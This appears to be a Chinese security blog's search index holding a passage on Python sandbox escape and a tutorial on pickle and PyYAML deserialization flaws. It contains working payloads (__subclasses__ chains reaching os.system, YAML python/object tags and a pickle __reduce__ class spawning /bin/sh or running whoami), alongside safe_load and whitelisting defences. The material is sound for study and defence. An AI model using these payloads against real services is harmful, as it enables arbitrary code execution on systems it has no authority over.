[\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;mailbox\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;mailcap\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;mimetypes\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;modulefinder\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;netrc\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;nntplib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ntpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;nturl2path\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;numbers\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;opcode\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;operator\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;optparse\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;os\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;pathlib\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pdb\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pickle\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pickletools\u0026#39;: [\u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pipes\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pkgutil\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;platform\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;platform\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;plistlib\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;codecs\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;poplib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;posixpath\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pprint\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;profile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pstats\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pty\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;py_compile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;compile\u0026#39;], \u0026#39;pyclbr\u0026#39;: [\u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;pydoc\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;platform\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;queue\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;quopri\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;random\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;re\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;compile\u0026#39;], \u0026#39;reprlib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;rlcompleter\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;runpy\u0026#39;: [\u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sched\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;secrets\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;selectors\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;shelve\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;shlex\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;shutil\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;signal\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;site\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;smtpd\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;smtplib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sndhdr\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;socket\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;socketserver\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sre_compile\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;compile\u0026#39;], \u0026#39;sre_constants\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;sre_parse\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;ssl\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;stat\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;statistics\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;string\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;stringprep\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;struct\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;subprocess\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;sunau\u0026#39;: [\u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;symbol\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;symtable\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;sysconfig\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tabnanny\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tarfile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;telnetlib\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tempfile\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;textwrap\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;this\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;threading\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;timeit\u0026#39;: [\u0026#39;timeit\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;token\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;tokenize\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;trace\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;traceback\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tracemalloc\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;tty\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;turtle\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;types\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;typing\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;uu\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;uuid\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;warnings\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;wave\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;weakref\u0026#39;: [\u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;webbrowser\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;open\u0026#39;], \u0026#39;xdrlib\u0026#39;: [\u0026#39;__builtins__\u0026#39;], \u0026#39;zipapp\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;], \u0026#39;zipfile\u0026#39;: [\u0026#39;os\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;__builtins__\u0026#39;]} target_modules = [\u0026#39;os\u0026#39;, \u0026#39;platform\u0026#39;, \u0026#39;subprocess\u0026#39;, \u0026#39;timeit\u0026#39;, \u0026#39;importlib\u0026#39;, \u0026#39;codecs\u0026#39;, \u0026#39;sys\u0026#39;] target_functions = [\u0026#39;__import__\u0026#39;, \u0026#39;__builtins__\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;execfile\u0026#39;, \u0026#39;compile\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;open\u0026#39;] all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions)) all_modules = list(set(list(find_modules.keys()) + target_modules)) subclasses = ().__class__.__bases__[0].__subclasses__() sub_name = [s.__name__ for s in subclasses] # 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](\u0026#39;./test.py\u0026#39;).read() print(\u0026#39;----------1-----------\u0026#39;) for i, s in enumerate(sub_name): for f in all_targets: if f == s: if f in target_functions: print(i, f) elif f in all_modules: target = find_modules[f] sub_dict = subclasses[i].__dict__ for t in target: if t in sub_dict: print(i, f, target) print(\u0026#39;----------2-----------\u0026#39;) # 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;].__dict__[\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;].__dict__[\u0026#39;sy\u0026#39;+\u0026#39;stem\u0026#39;](\u0026#39;ls\u0026#39;) for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__ for m in all_targets: if m in more: print(i, sub, m, find_modules.get(m)) except Exception as e: pass print(\u0026#39;----------3-----------\u0026#39;) # 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39;) for i, sub in enumerate(subclasses): try: more = sub.__init__.__globals__.values() for j, v in enumerate(more): for f in all_targets: try: if f in v: if f in target_functions: print(i, j, sub, f) elif f in all_modules: target = find_modules.get(f) sub_dict = v[f].__dict__ for t in target: if t in sub_dict: print(i, j, sub, f, target) except Exception as e: pass except Exception as e: pass print(\u0026#39;----------4-----------\u0026#39;) # 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;) # \u0026lt;class \u0026#39;warnings.catch_warnings\u0026#39;\u0026gt;类很特殊，在内部定义了_module=sys.modules[\u0026#39;warnings\u0026#39;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似 for i, sub in enumerate(subclasses): try: more = sub()._module.__builtins__ for f in all_targets: if f in more: print(i, f) except Exception as e: pass 参考：\n一文看懂Python沙箱逃逸\npython 沙箱逃逸与SSTI\nCTF Wiki Python沙箱逃逸 Python安全学习—Python沙盒逃逸\nPython沙箱逃逸总结\nPython 沙盒绕过 ","date":"2025-06-01T10:29:30+08:00","permalink":"https://Oight.github.io/p/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/","title":"Python沙箱逃逸"},{"content":"Python 反序列化漏洞\r什么是Python的序列化与反序列化\r什么是Python的序列化\r众所周知，Python是一种面向对象的语言。在Python中，一切皆对象。数字，字符串，函数，模块等等，都是对象。对象的本质是内存中的一个数据结构，包含属性（数据）和方法（操作）。\n由于Python中对象的形式多种多样，变化万千，在存储时按照原本的形式来存储过于庞大且麻烦，所以我们就需要把Python对象转换为可存储或可传输的标准化格式。将Python对象转换为可存储或传输的标准化格式（如字节流、字符串）的过程，就叫做Python的序列化。\n什么是Python的反序列化\r既然为了存储和传输方便，将Python对象通过序列化的方式转换成了一种标准化的格式，那么在程序执行时，我们就需要把标准化格式还原为Python对象，而这个过程，就叫做Python的反序列化。\n序列化的本质\r序列化的本质是将对象的状态或数据结构转换为一种通用格式（如二进制，JSON，XML），使其可以保存到文件、数据库或通过网络传输。 反序列化是逆过程，将序列化后的数据还原为原始对象。 Python中序列化的实现过程\rPython庞大的库，为Python强大的功能实现提供支撑和保障。同样的，Python中序列化和反序列化的实现也是通过一些库和模块来实现的。\npickle模块 作为Python的原生模块，pickle支持几乎所有的Python对象 使用pickle进行序列化生成的是二进制格式数据 代码示例：\n1 2 3 4 5 6 7 8 import pickle data = {\u0026#34;name\u0026#34;: \u0026#34;Alice\u0026#34;, \u0026#34;age\u0026#34;: 30} serialized_data = pickle.dumps(data) # 序列化为字节流 # 保存到文件 with open(\u0026#34;data.pkl\u0026#34;, \u0026#34;wb\u0026#34;) as f: pickle.dump(data, f) json模块 json可以生成人类可读的JSON字符串 但json只支持基础类型（字典、列表、字符串、数字等），不支持Python特有对象（如类实例）的序列化。 代码示例：\n1 2 3 4 5 6 7 8 import json data = {\u0026#34;name\u0026#34;: \u0026#34;Bob\u0026#34;, \u0026#34;age\u0026#34;: 25} json_str = json.dumps(data) # 序列化为JSON字符串 # 保存到文件 with open(\u0026#34;data.json\u0026#34;, \u0026#34;w\u0026#34;) as f: json.dump(data, f) PyYAML库 YAML（YAML Ain’t Markup Language）是一种人类可读的数据序列化格式，常用于配置文件和数据交换。Python 中通过 PyYAML 库支持 YAML。 序列化实现：\n1 2 3 4 5 6 7 8 9 10 11 12 import yaml data = { \u0026#34;name\u0026#34;: \u0026#34;Alice\u0026#34;, \u0026#34;age\u0026#34;: 30, \u0026#34;skills\u0026#34;: [\u0026#34;Python\u0026#34;, \u0026#34;YAML\u0026#34;], \u0026#34;address\u0026#34;: {\u0026#34;city\u0026#34;: \u0026#34;Shanghai\u0026#34;, \u0026#34;zip\u0026#34;: 200000} } # 序列化为YAML字符串 yaml_str = yaml.dump(data, default_flow_style=False) print(yaml_str) 输出：\n1 2 3 4 5 6 7 8 address: city: Shanghai zip: 200000 age: 30 name: Alice skills: - Python - YAML 保存/读取文件：\n1 2 3 4 5 6 7 # 写入文件 with open(\u0026#34;data.yaml\u0026#34;, \u0026#34;w\u0026#34;) as f: yaml.dump(data, f) # 读取文件 with open(\u0026#34;data.yaml\u0026#34;, \u0026#34;r\u0026#34;) as f: loaded_from_file = yaml.safe_load(f) 使用 Protocol Buffers（protobuf）实现序列化 Protocol Buffers 是 Google 开发的高效二进制序列化格式，适合高性能通信和跨语言数据交换。需预先定义数据结构（.proto 文件）。 Python中反序列化实现过程\r在以上Python序列化实现过程中，使用pickle模块和Pyyaml库，在实现反序列化的过程中存在安全风险。我们先来看看他们的反序列化过程是如何实现的\nYAML 反序列化实现\rYAML的反序列化过程通过PyYAML库实现，本质是将YAML文本解析为Python对象。默认的 yaml.load() 方法支持动态构造Python对象（包括类实例），但这也带来了安全风险。\n反序列化步骤：\r1.安装依赖\n1 pip install pyyaml 2.基础反序列化（安全模式）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import yaml # YAML 文本（仅包含基础类型） yaml_text = \u0026#34;\u0026#34;\u0026#34; name: Alice age: 30 skills: - Python - YAML \u0026#34;\u0026#34;\u0026#34; # 安全反序列化：仅解析基本类型（字典、列表等） data = yaml.safe_load(yaml_text) print(data[\u0026#34;name\u0026#34;]) # 输出 Alice 3.动态对象反序列化（危险！）：\nYAML 可以通过标签（!!python/object）动态构造 Python 对象，例如：\n1 2 # 恶意示例：反序列化时执行代码 !!python/object/apply:os.system [\u0026#34;echo \u0026#39;Hacked!\u0026#39;\u0026#34;] 危险的反序列化代码：\n1 2 3 4 5 # 不要对不可信数据使用 yaml.load()！ malicious_yaml = \u0026#34;\u0026#34;\u0026#34; !!python/object/apply:os.system [\u0026#34;echo \u0026#39;Hacked!\u0026#39;\u0026#34;] \u0026#34;\u0026#34;\u0026#34; yaml.load(malicious_yaml, Loader=yaml.UnsafeLoader) # 输出 Hacked! 安全实践\n始终使用 yaml.safe_load()：仅解析基础类型（字典、列表、字符串、数字），禁止动态对象构造。\n禁用危险标签：若必须解析对象，需自定义加载器，过滤允许的类。\n1 2 3 4 5 6 7 8 9 10 11 12 13 from yaml import SafeLoader, Node, Constructor class RestrictedLoader(SafeLoader): def construct_python_object(self, node: Node): raise yaml.ConstructorError(\u0026#34;禁止动态对象构造\u0026#34;) # 注册自定义加载器 RestrictedLoader.add_constructor( \u0026#34;tag:yaml.org,2002:python/object\u0026#34;, RestrictedLoader.construct_python_object ) data = yaml.load(yaml_text, Loader=RestrictedLoader) # 安全加载 Pickle 反序列化实现\rPickle 的反序列化通过 pickle.load() 或 pickle.loads() 实现，其底层会重建对象的完整状态，包括调用__reduce__方法（若存在），从而可能执行任意代码。\n反序列化步骤：\r1.序列化一个对象：\n1 2 3 4 5 6 7 8 9 import pickle class User: def __init__(self, name): self.name = name # 序列化对象 user = User(\u0026#34;Alice\u0026#34;) serialized = pickle.dumps(user) 2.基础反序列化:\n1 2 3 # 反序列化 loaded_user = pickle.loads(serialized) print(loaded_user.name) # 输出 Alice 3.恶意反序列化示例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 import pickle import os class Malicious: def __reduce__(self): # 反序列化时执行系统命令 return (os.system, (\u0026#34;echo \u0026#39;Hacked!\u0026#39;\u0026#34;,)) # 生成恶意 payload payload = pickle.dumps(Malicious()) # 反序列化触发攻击 pickle.loads(payload) # 输出 Hacked! 安全风险根源:\n__reduce__方法：在反序列化时自动调用，返回一个元组（函数、参数），执行函数。\n任意代码执行：攻击者可构造恶意__reduce__方法，执行危险操作（如删除文件、反弹Shell）。\n防御方法\n避免反序列化不可信数据：永远不要对来源未知的数据使用 pickle.load()。\n限制允许的类（白名单）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import pickle class SafeUnpickler(pickle.Unpickler): allowed_classes = {\u0026#34;__main__.User\u0026#34;} # 仅允许User类 def find_class(self, module, name): full_name = f\u0026#34;{module}.{name}\u0026#34; if full_name not in self.allowed_classes: raise pickle.UnpicklingError(f\u0026#34;禁止的类: {full_name}\u0026#34;) return super().find_class(module, name) # 安全反序列化 safe_data = SafeUnpickler(io.BytesIO(serialized)).load() 反序列化漏洞的成因\r我们上面提到了YAML和pickle的反序列化过程以及他们的风险漏洞，这里来总结一下。\nYAML的反序列化漏洞\r造成YAML反序列化漏洞的原因是由于过于相信YAML数据来源，在反序列化的过程中使用了一些危险标签，使得攻击者利用这些标签使用 yaml.load() 方法来动态构造Python对象，导致程序错误地调用了 os.system() 进行命令执行\nPickle 的反序列化漏洞\r造成pickle反序列化漏洞的原因是在反序列化过程中，存在调用__reduce__方法的可能，这一方法使得攻击者可以通过构造恶意类，在__reduce__中返回一个危险的可调用对象（如 os.system），从而在反序列化时触发任意代码执行。\n为什么__reduce__危险？\r完全控制反序列化逻辑： __reduce__允许攻击者指定任意函数和参数，且反序列化时自动执行。\n绕过对象状态限制： 即使目标代码中没有恶意类，攻击者也可以构造包含危险函数的__reduce__。\nPython反序列化漏洞的利用\r我们已经讨论过Python中的反序列化漏洞是由于错误使用yaml.load()、危险标签和__reduce__，导致的命令执行漏洞，因此，我们的利用点也着眼于此。\nyaml漏洞的利用\r对于PyYaml\u0026lt;5.1版本下的漏洞，其主要原因主要出现在下面五个python标签：\n1 2 3 4 5 python/name python/module python/object python/object/new python/object/apply 漏洞成因：\n由于上面提到的五个标签，在constructor.py文件被加载器解析导致，攻击者利用这类标签可以达到任意命令执行，以及验证绕过等漏洞的利用。\npayload：\n1 2 3 4 !!python/object/apply:os.system [\u0026#34;calc.exe\u0026#34;] !!python/object/new:os.system [\u0026#34;calc.exe\u0026#34;] !!python/object/new:subprocess.check_output [[\u0026#34;calc.exe\u0026#34;]] !!python/object/apply:subprocess.check_output [[\u0026#34;calc.exe\u0026#34;]] 在5.1之后的yaml中load函数被限制使用了，会被警告提醒加上一个参数 Loader\n针对不同的需要，选择不同的加载器，有以下几种加载器\n1 2 3 4 5 6 7 8 9 BaseConstructor：仅加载最基本的YAML SafeConstructor：安全加载Yaml语言的子集，建议用于加载不受信任的输入（safe_load) FullConstructor：加载的模块必须位于 sys.modules 中（说明程序已经 import 过了才让加载）。这个是默认的加载器。 UnsafeConstructor（也称为Loader向后兼容性）：原始的Loader代码，可以通过不受信任的数据输入轻松利用（unsafe_load） Constructor：等同于UnsafeConstructor 如果说指定的加载器是UnsafeConstructor 或者Constructor，那么利用方式就照旧\npayload\n我们可以用python的内置函数eval（或者exec）来执行代码，用map来触发函数执行，用tuple将map对象转化为元组输出来（当然用list、frozenset、bytes都可以），用python写出来如下\n1 tuple(map(eval, [\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;])) 变为yaml\n1 2 3 4 5 6 yaml.load(\u0026#34;\u0026#34;\u0026#34; !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34;] \u0026#34;\u0026#34;\u0026#34;) 除此之外网上还有很多大佬有其他的payload\n1 2 3 4 #创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数 !!python/object/new:type args: [\u0026#34;z\u0026#34;, !!python/tuple [], {\u0026#34;extend\u0026#34;: !!python/name:exec }] listitems: \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34; 1 2 3 4 5 6 7 8 9 #报错但是执行了 - !!python/object/new:str args: [] state: !!python/tuple - \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;whoami\u0026#39;)\u0026#34; - !!python/object/new:staticmethod args: [0] state: update: !!python/name:exec 1 2 3 4 5 6 - !!python/object/new:yaml.MappingNode listitems: !!str \u0026#39;!!python/object/apply:subprocess.Popen [whoami]\u0026#39; state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load 参考：\nPyYaml反序列化漏洞\nPyYAML反序列化漏洞\nPickle 漏洞利用\r漏洞常见出现地方\n通常在解析认证token, session的时候. 现在很多 Web 服务都使用redis、mongodb、memcached等来存储session等状态信息. 可能将对象 Pickle 后存储成磁盘文件. 可能将对象 Pickle 后在网络中传输. 基本 Payload\n1 2 3 4 5 6 7 8 9 10 import os import pickle class Demo(object): def __reduce__(self): shell = \u0026#39;/bin/sh\u0026#39; return (os.system,(shell,)) demo = Demo() pickle.loads(pickle.dumps(demo)) Marshal 反序列化\r由于pickle无法序列化code对象, 因此在python2.6后增加了一个marshal模块来处理code对象的序列化问题.\n1 2 3 4 5 6 7 8 9 import base64 import marshal def demo(): import os os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(demo())) print(code_serialized) 但是marshal不能直接使用__reduce__, 因为reduce是利用调用某个callable并传递参数来执行的, 而marshal函数本身就是一个callable, 需要执行它, 而不是将他作为某个函数的参数.\nPyload(PyYaml \u0026gt;= 5.1)\n1 2 3 4 5 from yaml import * data = b\u0026#34;\u0026#34;\u0026#34;!!python/object/apply:subprocess.Popen - calc\u0026#34;\u0026#34;\u0026#34; deserialized_data = load(data, Loader=Loader) print(deserialized_data) 1 2 3 4 5 from yaml import * data = b\u0026#34;\u0026#34;\u0026#34;!!python/object/apply:subprocess.Popen - calc\u0026#34;\u0026#34;\u0026#34; deserialized_data = unsafe_load(data) print(deserialized_data) 参考：\nPython反序列化漏洞与沙箱逃逸\nPickle反序列化\nPython安全学习—Python反序列化漏洞\npython反序列化详解\n其他：\n关于callable： 在 Python 中，“callable”（可调用对象） 是指任何可以通过 () 运算符调用的对象。简单来说，如果一个对象可以像函数一样被调用（例如 obj()），它就是可调用的。以下是关于 callable 的详细解释：\n1. 常见的可调用对象类型\r(1) 函数（Function）\r包括内置函数、自定义函数、Lambda 函数。\n1 2 3 4 5 6 7 8 9 10 python def greet(name): print(f\u0026#34;Hello, {name}!\u0026#34;) # 调用函数 greet(\u0026#34;Alice\u0026#34;) # 输出 Hello, Alice! # Lambda 也是可调用的 add = lambda a, b: a + b print(add(3, 5)) # 输出 8 (2) 类（Class）\r类本身是可调用的\n，调用类会创建它的实例。\n1 2 3 4 5 6 7 python class Dog: def __init__(self, name): self.name = name # 调用类创建实例 my_dog = Dog(\u0026#34;Buddy\u0026#34;) # Dog 类是可调用的 (3) 方法（Method）\r类中定义的方法（实例方法、类方法、静态方法）。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 python class Calculator: def add(self, a, b): # 实例方法 return a + b @classmethod def multiply(cls, a, b): # 类方法 return a * b @staticmethod def subtract(a, b): # 静态方法 return a - b calc = Calculator() calc.add(2, 3) # 实例方法调用 Calculator.multiply(2, 3) # 类方法调用 Calculator.subtract(5, 2) # 静态方法调用 (4) 实现了 __call__ 方法的对象\r如果一个类定义了\n1 __call__ 方法，它的实例会成为可调用对象。\n1 2 3 4 5 6 7 8 9 10 python class Adder: def __init__(self, x): self.x = x def __call__(self, y): return self.x + y add_5 = Adder(5) print(add_5(3)) # 输出 8（等价于 add_5.__call__(3)） (5) 其他内置可调用对象\r生成器函数、部分函数（\n1 functools.partial ）等。\n1 2 3 4 5 6 7 8 python import functools def power(base, exp): return base ** exp square = functools.partial(power, exp=2) # 部分函数 print(square(3)) # 输出 9 2. 如何判断一个对象是否可调用？\r使用内置函数 callable() 可以检测对象是否可调用：\n1 2 3 4 python print(callable(len)) # True（内置函数） print(callable(\u0026#34;hello\u0026#34;)) # False（字符串不可调用） print(callable(Adder(5))) # True（实现了 __call__ 的实例） 3. 不可调用的对象示例\r基础数据类型：整数、字符串、列表等。\n1 2 3 python x = 42 x() # 报错：\u0026#39;int\u0026#39; object is not callable 未实现 __call__ 的实例：\n1 2 3 4 5 6 python class Cat: pass my_cat = Cat() my_cat() # 报错：\u0026#39;Cat\u0026#39; object is not callable 4. Callable 的实际应用场景\r装饰器（Decorator）：\n装饰器本身必须是可调用对象（函数或类）。\n1 2 3 4 5 6 7 8 9 10 11 12 python def logger(func): def wrapper(*args, **kwargs): print(f\u0026#34;Calling {func.__name__}\u0026#34;) return func(*args, **kwargs) return wrapper @logger def say_hello(): print(\u0026#34;Hello!\u0026#34;) say_hello() # 输出 \u0026#34;Calling say_hello\u0026#34; 和 \u0026#34;Hello!\u0026#34; 动态调用函数：\n通过变量名动态调用函数。\n1 2 3 4 5 6 python def do_operation(op, a, b): operations = {\u0026#34;add\u0026#34;: lambda x, y: x + y, \u0026#34;mul\u0026#34;: lambda x, y: x * y} return operations[op](a, b) print(do_operation(\u0026#34;add\u0026#34;, 3, 5)) # 输出 8 回调机制：\n将函数作为参数传递，在特定事件发生时调用。\n1 2 3 4 5 6 7 8 9 python def on_button_click(callback): print(\u0026#34;按钮被点击了！\u0026#34;) callback() def show_message(): print(\u0026#34;执行回调函数\u0026#34;) on_button_click(show_message) 总结\r可调用对象是 Python 的核心概念之一，包括函数、类、方法和实现了 __call__ 的实例。 使用 callable() 可以快速检测对象是否可调用。 理解 callable 是掌握装饰器、动态编程和回调机制的关键。 